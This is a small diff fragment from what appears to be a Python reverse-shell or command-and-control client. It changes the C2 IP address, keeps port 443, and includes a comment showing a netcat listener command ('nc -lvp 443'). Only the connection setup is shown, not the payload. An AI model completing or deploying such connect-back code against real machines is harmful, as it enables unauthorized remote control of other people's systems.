@@ -8,7 +8,7 @@ import os
 #sudo nc -lvp 443
 
 
-CCIP = "192.168.43.197"
+CCIP = "192.168.1.123"
 CCPORT = 443 #SSL Conection
 
 def conn(CCIP, CCPORT):
